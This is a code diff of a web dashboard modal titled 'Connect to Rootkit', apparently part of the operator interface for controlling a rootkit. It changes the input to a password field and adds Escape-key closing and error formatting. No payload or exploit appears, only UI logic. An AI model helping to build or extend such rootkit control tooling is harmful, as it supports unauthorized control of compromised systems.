@@ -1,17 +1,16 @@
 <div id="connect-modal" class="modal hidden">
     <div class="modal-content">
-        <span class="close" onclick="closeConnectModal()">&times;</span>
+        <span class="close" onclick="modal.close()">&times;</span>
         <h3>Connect to Rootkit</h3>
         <p class="error-message hidden"></p>
         <span class="modal-main-span">
-            <input type="text" id="connect-input" placeholder="Enter connection details..."
+            <input type="password" id="connect-input" placeholder="Enter rootkit password..."
                 autofocus onkeypress="if(event.key === 'Enter') connectToRootkit()">
             <button onclick="connectToRootkit()" id="connect_button">Connect</button>
         </span>
     </div>
 
     <script>
-        // Modal object to handle opening and closing of the connection modal
         const modal = {
             open() {
                 dom.connectModal.classList.remove('hidden');
@@ -23,7 +22,14 @@
                 dom.connectModal.style.display = 'none';
             },
         };
-
+    
+        // Close modal when Escape key is pressed
+        document.addEventListener('keydown', (event) => {
+            if (event.key === 'Escape') {
+                modal.close();
+            }
+        });
+    
         // Handle successful connection
         function handleSuccess() {
             dom.errorMessage.textContent = '';
@@ -32,11 +38,11 @@
             updateDashboard();
             toggleButtonState(dom.connectButton, false, 'Connect');
         }
-
+    
         // Handle connection errors
         function handleError(status, data) {
             let errorText = 'Connection failed.';
-
+    
             if (status === 403) {
                 errorText = 'Authentication failed.';
             } else if (data && data.error) {
@@ -44,18 +50,18 @@
             } else {
                 errorText += ` (code ${status})`;
             }
-
-            dom.errorMessage.textContent = errorText;
+    
+            dom.errorMessage.textContent = "❌ " + errorText;
             dom.errorMessage.classList.remove('hidden');
             toggleButtonState(dom.connectButton, false, 'Connect');
         }
-
+    
         // Toggle the state of a button (enabled/disabled)
         function toggleButtonState(button, disabled, text) {
             button.disabled = disabled;
             button.textContent = text;
         }
-
+    
         // Wait for a condition to be met, checking periodically
         async function waitForCacheUpdate(conditionFn, interval = 200) {
             return new Promise(resolve => {
@@ -67,21 +73,21 @@
                 }, interval);
             });
         }
-
+    
         // Connect to rootkit
         async function connectToRootkit() {
             dom.errorMessage.classList.add('hidden');
             toggleButtonState(dom.connectButton, true, 'Connecting...');
-
+    
             const details = dom.connectInput.value;
             const { data, status } = await sendCommand(URL_CONNECT, details);
-
+    
             if (status === 200) {
                 await waitForCacheUpdate(() => clientInfoCache.authenticated === true);
                 handleSuccess();
             } else {
                 handleError(status, data);
             }
-}
-    </script>
+        }
+    </script>    
 </div>
